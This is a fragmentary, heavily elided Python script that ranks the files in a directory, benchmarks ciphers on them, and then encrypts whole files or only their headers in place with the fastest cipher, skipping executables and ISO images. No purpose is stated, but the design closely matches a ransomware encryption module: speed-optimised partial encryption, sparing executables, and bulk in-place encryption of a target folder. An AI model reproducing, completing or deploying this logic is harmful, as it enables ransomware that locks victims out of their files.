...
async def priortize_files(directory_to_check, types_to_ignore=[], size_limit_mb=200, priority_limit=3):
    ...
    return [f[1] for f in ready_for_encryption if f[6]], [f[1] for f in ready_for_encryption if f[7]]


async def encryption_time_estimate(file_path, output_path, cipher_func, *args):
    """
...
async def header_encryption_time_estimate(file_path, cipher_func, output_file=None, *args):
    """
    Encrypts the file using the provided cipher function and returns the encryption time.
    """
    start_time = time.time()
...
async def encrypt_files(files_to_encrypt, headers_to_encrypt):
    """
    ...
    with tempfile.TemporaryDirectory() as enc_dir:
        encryption_results.extend(await encrypt_full_files(files_to_encrypt, enc_dir))
        encryption_results.extend(await encrypt_header_only(headers_to_encrypt, enc_dir))
...
async def encrypt_full_files(files_to_encrypt, enc_dir):
    """
    ...
    for file_path in files_to_encrypt:
            ...
            encryption_times = [
                await encryption_time_estimate(
                    file_path,
...
async def encrypt_header_only(files_to_encrypt, enc_dir):
    """
    Encrypts regular files and returns encryption results.
    """
    encryption_results = []
    ...
    for file_path in files_to_encrypt:
        ...
        encryption_times = [
            await header_encryption_time_estimate(
                file_path,
                cipher["encrypt_file"],
                f"{enc_dir}/{file_name}_{cipher_name.lower()}.enc",
                *cipher["args"],
...
async def encrypt_files_with_best_cipher(folder_path, encryption_results):
    ciphers_combined = {**ciphers, **ciphers_for_header} 

    async def encrypt_file(file_info):
    ...
    await asyncio.gather(*(encrypt_file(file_info) for file_info in encryption_results))
...
async def run_file(directory_to_check):
    priortized_files, only_header = await priortize_files(directory_to_check, ["exe", "iso", "pptx"], 50)

    encryption_results = await encrypt_files(priortized_files, only_header)
    ...
    await encrypt_files_with_best_cipher(directory_to_check, encryption_results)
...
asyncio.run(run_file(r"files\Folder"))
